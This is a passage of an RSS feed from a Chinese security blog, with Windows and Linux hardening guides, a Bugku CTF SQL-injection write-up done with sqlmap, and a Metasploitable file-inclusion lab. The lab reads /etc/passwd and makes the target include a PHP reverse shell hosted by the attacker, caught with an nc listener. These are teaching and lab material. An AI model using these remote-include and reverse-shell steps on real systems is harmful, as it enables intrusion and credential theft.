src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615154011.png" alt>   </p><h4 id="4-设置安全审计"><a href="#4-设置安全审计" class="headerlink" title="4.设置安全审计"></a>4.设置安全审计</h4><p>在主机的审核策略上设置日志审核策略<br>操作流程：进入“控制面板-&gt;管理工具-&gt;本地安全策略”，在“本地策略-&gt;审核策略”<br>在主机的审核策略上设置日志审核策略：<br></p><blockquote><p>审计帐户登录事件： 成功，失败 <br><br>审计帐户管理： 成功，失败 <br><br>审计目录服务访问： 成功，失败<br><br>审计登录事件： 成功，失败 <br><br>审计对象访问： 成功，失败 <br><br>审计策略更改： 成功，失败 <br><br>审计特权使用： 成功，失败 <br><br>审计系统事件： 成功，失败<br><br>审计过程追踪： 成功，失败</p></blockquote><p><strong>加固前:</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615154341.png" alt><br><strong>加固后:</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615154347.png" alt></p><h4 id="5-设置不显示上次使用的用户名"><a href="#5-设置不显示上次使用的用户名" class="headerlink" title="5.设置不显示上次使用的用户名"></a>5.设置不显示上次使用的用户名</h4><p>在本地安全设置系统登录时不显示上次使用的用户名。<br>进入“控制面板-&gt;管理工具-&gt;本地安全策略”，在“本地策略-&gt;安全选项”；   </p><blockquote><p>“交互式登录：不显示上次的用户名”设置为“已启用”   </p></blockquote><p><strong>加固前：</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615154607.png" alt><br><strong>加固后：</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615154633.png" alt>   </p><h4 id="6启用主机安全选项的”关机前清除虚拟内存页面”"><a href="#6启用主机安全选项的”关机前清除虚拟内存页面”" class="headerlink" title="6启用主机安全选项的”关机前清除虚拟内存页面”"></a>6启用主机安全选项的”关机前清除虚拟内存页面”</h4><p>启用主机安全选项的“关机前清除虚拟内存页面<br>操作流程:进入“控制面板-&gt;管理工具-&gt;本地安全策略”，在“本地策略-&gt;安全选项   </p><blockquote><p>关机：清除虚拟页面文件内存”设置为“已启用”   </p></blockquote><p><strong>加固前：</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615154913.png" alt><br><strong>加固后：</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615155009.png" alt></p><h4 id="7-配置日志文件大小"><a href="#7-配置日志文件大小" class="headerlink" title="7.配置日志文件大小"></a>7.配置日志文件大小</h4><p>   配置日志文件容量，避免受到未预期的删除、修改或覆盖等<br> 操作流程：进入“控制面板-&gt;管理工具-&gt;计算机管理-&gt;事件查看器-&gt;windows日志”，配置<br><strong>加固前：<br> <img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615155216.png" alt><br>加固后：</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615155337.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615155348.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615155441.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615155449.png" alt>   </p><h4 id="8-磁盘配额配置"><a href="#8-磁盘配额配置" class="headerlink" title="8.磁盘配额配置"></a>8.磁盘配额配置</h4><p>磁盘配额可以限制指定账户能够使用的磁盘空间,这样可以避免因某个用户的过度使用磁盘空间造成其他用户无法正常工作甚至影响系统运行<br>操作流程：进入“我的电脑-&gt;C盘-&gt;属性-&gt;配额”，   </p><blockquote><p>“启用磁盘管理”设置为启用<br><br>“磁盘空间限制为”设置为”90GB”<br><br>“将警告等级设为”设置为”90GB”<br><br>“用户超出配额限制时记录事件（G）”打勾启用<br><br>“用户超过警告等级时记录事件（V）”    打勾启用<br></p></blockquote><p><strong>加固前：</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615155700.png" alt><br><strong>加固后：</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615155707.png" alt></p><h4 id="9-远程会话策略"><a href="#9-远程会话策略" class="headerlink" title="9.远程会话策略"></a>9.远程会话策略</h4><p>默认情况下，远程桌面服务允许用户从远程桌面服务会话开连接，而不用注销和结束会话。启用此策略设置，则达到指定时间后将从服务器中删除已断开连接的会话<br>操作流程：进入“运行-&gt;gpedit.msc-&gt;计算机配置-&gt;管理模板-&gt;wondows组件-&gt;远程服务-&gt;远程桌面会话主机-&gt;会话时间限制”，   </p><blockquote><p>“设置已中断会话的时间限制”设置为“已启用”<br><br>“结束已断开连接的会话”设置为“5分钟”    </p></blockquote><p><strong>加固前：</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615155926.png" alt>   <strong>加固后:</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615160011.png" alt>   </p>]]></content:encoded>
      
      <comments>https://jaie.cc/2019/06/15/windows%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%BB%E6%9C%BA%E5%8A%A0%E5%9B%BA/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Bugku-web题，ctf模拟题sql注入神奇的登陆框</title>
      <link>https://jaie.cc/2019/05/17/Bugku-web%E9%A2%98%EF%BC%8Cctf%E6%A8%A1%E6%8B%9F%E9%A2%98sql%E6%B3%A8%E5%85%A5%E7%A5%9E%E5%A5%87%E7%9A%84%E7%99%BB%E9%99%86%E6%A1%86/</link>
      <guid>https://jaie.cc/2019/05/17/Bugku-web%E9%A2%98%EF%BC%8Cctf%E6%A8%A1%E6%8B%9F%E9%A2%98sql%E6%B3%A8%E5%85%A5%E7%A5%9E%E5%A5%87%E7%9A%84%E7%99%BB%E9%99%86%E6%A1%86/</guid>
      <pubDate>Fri, 17 May 2019 00:43:16 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;这是Bugku-web题，地址为&lt;a href=&quot;http://123.206.87.240:9001/sql/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://123.206.87.240:9001/sql/&lt;/a&gt;&lt;br&gt;登陆网站，打开bu
        
      
      </description>
      
      <content:encoded><![CDATA[<p>这是Bugku-web题，地址为<a href="http://123.206.87.240:9001/sql/" target="_blank" rel="noopener">http://123.206.87.240:9001/sql/</a><br>登陆网站，打开burp进行截断，账号密码随便打，burp截取后进行保存。<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190429130526.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190429130714.png" alt><br>使用sqlmap自动注入，可以发现数据库版本，数据库名<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190429114029.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190429114138.png" alt><br>使用sqlmap自动注入，发现表名flag1<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190429132601.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190429132651.png" alt><br>使用sqlmap自动注入，查看表flag1中列flag1的值<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190429130920.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190429131021.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190429131114.png" alt><br>使用sqlmap自动注入，可以列flag1的值<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190429131144.png" alt></p>]]></content:encoded>
      
      <comments>https://jaie.cc/2019/05/17/Bugku-web%E9%A2%98%EF%BC%8Cctf%E6%A8%A1%E6%8B%9F%E9%A2%98sql%E6%B3%A8%E5%85%A5%E7%A5%9E%E5%A5%87%E7%9A%84%E7%99%BB%E9%99%86%E6%A1%86/#disqus_thread</comments>
    </item>
    
    <item>
      <title>linux系统安全配置</title>
      <link>https://jaie.cc/2019/05/17/linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/</link>
      <guid>https://jaie.cc/2019/05/17/linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/</guid>
      <pubDate>Fri, 17 May 2019 00:42:53 GMT</pubDate>
      <description>
      
        
        
          &lt;h3 id=&quot;用户管理&quot;&gt;&lt;a href=&quot;#用户管理&quot; class=&quot;headerlink&quot; title=&quot;用户管理&quot;&gt;&lt;/a&gt;用户管理&lt;/h3&gt;&lt;h5 id=&quot;1-删除系统特殊的用户账号和组账号&quot;&gt;&lt;a href=&quot;#1-删除系统特殊的用户账号和组账号&quot; class=&quot;he
        
      
      </description>
      
      <content:encoded><![CDATA[<h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><h5 id="1-删除系统特殊的用户账号和组账号"><a href="#1-删除系统特殊的用户账号和组账号" class="headerlink" title="1.删除系统特殊的用户账号和组账号"></a>1.删除系统特殊的用户账号和组账号</h5><p>查看系统所有用户名<code>cat /etc/passwd</code><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190422211440.png" alt><br>删除用户jaie命令<code>userdel jaie</code></p><h5 id="2-用户密码设置"><a href="#2-用户密码设置" class="headerlink" title="2.用户密码设置"></a>2.用户密码设置</h5><p>编辑login.defs文件<code>vim /etc/login.defs</code><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190422212541.png" alt>   </p><h5 id="3-修改自动注销账户的时间"><a href="#3-修改自动注销账户的时间" class="headerlink" title="3.修改自动注销账户的时间"></a>3.修改自动注销账户的时间</h5><p>编辑profile<code>vim /etc/profile</code>修改“HISTSIZE”参数的值，即注销等待时间   <br></p><h5 id="4-给系统用户名密码存放文件加锁，防止非授权用户获得权限"><a href="#4-给系统用户名密码存放文件加锁，防止非授权用户获得权限" class="headerlink" title="4.给系统用户名密码存放文件加锁，防止非授权用户获得权限"></a>4.给系统用户名密码存放文件加锁，防止非授权用户获得权限</h5><p>用chattr命令防止系统中某个关键文件被修改:<code>chattr +i /etc/passwd</code><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190427213536.png" alt></p><h3 id="系统管理配置"><a href="#系统管理配置" class="headerlink" title="系统管理配置"></a>系统管理配置</h3><h5 id="1-关闭系统不必要的服务"><a href="#1-关闭系统不必要的服务" class="headerlink" title="1.关闭系统不必要的服务"></a>1.关闭系统不必要的服务</h5><p><code>cd /etc/init.d/</code>目录下，使用mv命令把init.d下改为*.old类的文件名，目的是让系统启动时找不到这个服务的文件<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190427214415.png" alt><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190427214415.png" alt></p><h5 id="2-修改init-d目录执行权限，防止修改"><a href="#2-修改init-d目录执行权限，防止修改" class="headerlink" title="2.修改init.d目录执行权限，防止修改"></a>2.修改init.d目录执行权限，防止修改</h5><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190427220856.png" alt></p><h5 id="3-给系统服务端口列表文件加锁"><a href="#3-给系统服务端口列表文件加锁" class="headerlink" title="3.给系统服务端口列表文件加锁"></a>3.给系统服务端口列表文件加锁</h5><p>防止未经许可的删除或添加服务<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190427215120.png" alt>   </p><h5 id="4-修改ssh服务端口"><a href="#4-修改ssh服务端口" class="headerlink" title="4.修改ssh服务端口"></a>4.修改ssh服务端口</h5><p><code>vi /etc/ssh/ssh_config</code>把port前的#去掉，并修改端口号，保存退出。重启shh服务<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190427220448.png" alt></p><h5 id="5-修改部分系统文件的SUID和SGID的权限"><a href="#5-修改部分系统文件的SUID和SGID的权限" class="headerlink" title="5.修改部分系统文件的SUID和SGID的权限"></a>5.修改部分系统文件的SUID和SGID的权限</h5><p>权限为SUID和SGID的执行文件，在程序运行过程中，会给进程所有者权限，如果被黑客利用就会给系统造成危害。修改chage文件的权限<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190427221401.png" alt>   </p><h5 id="6-日志管理"><a href="#6-日志管理" class="headerlink" title="6.日志管理"></a>6.日志管理</h5><p>使用dmesg查看系统引导日志<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190428201734.png" alt><br><code>cd /var/log/</code>在log中可以看到一些的日志文件，修改这些日志的权限可以防止不相干的人修改。   </p><ul><li>lastlog记录用户最后一次成功登录时间   </li><li>loginlog不良的登录尝试记录   </li><li>messages 记录输出系统主控台以及由syslog系统服务程序产生的消息  </li><li>utmp记录当前当前登录得每个用户</li><li>utmp扩展得utmp</li><li>wtmp 记录每一次用户登陆和注销的历史消息  </li><li>wtmpx 扩展的wtmp</li><li>vold.log记录使用外部介质出现的错误</li><li>xferkig记录ftp的存取情况</li><li>sulog记录su命令的使用情况</li><li>acct记录每个用户使用过的命令 </li><li>aculog拔出移动呼叫记录</li><li>XFree86.0.log记录Xfree86 Xwindows服务器最后一次执行的结果<br>文件数字带有.1,.2,.3…文件为轮询日志文件。数字越大，日志越老   </li></ul>]]></content:encoded>
      
      <comments>https://jaie.cc/2019/05/17/linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/#disqus_thread</comments>
    </item>
    
    <item>
      <title>文件遍历漏洞</title>
      <link>https://jaie.cc/2019/04/25/%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/</link>
      <guid>https://jaie.cc/2019/04/25/%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/</guid>
      <pubDate>Thu, 25 Apr 2019 07:54:06 GMT</pubDate>
      <description>
      
        
        
          &lt;ol&gt;
&lt;li&gt;环境搭建&lt;br&gt;测试机ip：192.168.86.135&lt;br&gt;&lt;br&gt;靶机metasploittable的ip:192.168.86.128&lt;br&gt;靶机编辑php.ini文件&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;sudo vim /etc/php5/c
        
      
      </description>
      
      <content:encoded><![CDATA[<ol><li>环境搭建<br>测试机ip：192.168.86.135<br><br>靶机metasploittable的ip:192.168.86.128<br>靶机编辑php.ini文件</li></ol><pre><code>sudo vim /etc/php5/cgi/php.ini  //编辑php配置文件</code></pre><p>找到allow_url_include这一行把Off改成On，  </p><pre><code>sudo /etc/init.d/apache2 restart //重启apache服务 </code></pre><ol start="2"><li>发起攻击  </li></ol><ul><li>尝试文件<code>/etc/passwd</code>遍历查看，成功。<br><img src="https://raw.githubusercontent.com/Jaie0801/temp/master/img/2018.11.21%2022.07-59.png" alt></li><li>尝试定位url链接，成功<br><img src="https://raw.githubusercontent.com/Jaie0801/temp/master/img/%E5%AE%9A%E4%BD%8D%E5%88%B0%E4%B8%80%E4%B8%AAurl%202018.11.21%2022.13-23.png" alt></li><li>测试机开启apache服务，制作php反弹shell，使其定位其链接<a href="http://192.168.86.135/1.php" target="_blank" rel="noopener">http://192.168.86.135/1.php</a><br><code>`</code><br>cp /url/share/webshells/php/php-reverse-shell.php /var/www/html/1.php  //复制成1.php到web目录下<br>vim 1.php //修改127.0.0.1成测试机ip完成保存<br>service apache2 start  //开启apache服务<br><br>nc -nvvlp 1234  //nc开启监控端口</li></ul><p><code>`</code><br><img src="https://raw.githubusercontent.com/Jaie0801/temp/master/img/php%E5%8F%8D%E5%BC%B9shell.png" alt><br><img src="https://raw.githubusercontent.com/Jaie0801/temp/master/img/2018.11.21%2022.27-9.png" alt><br><img src="https://raw.githubusercontent.com/Jaie0801/temp/master/img/2018.11.21%2022.28-18.png" alt></p>]]></content:encoded>
      
      <comments>https://jaie.cc/2019/04/25/%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
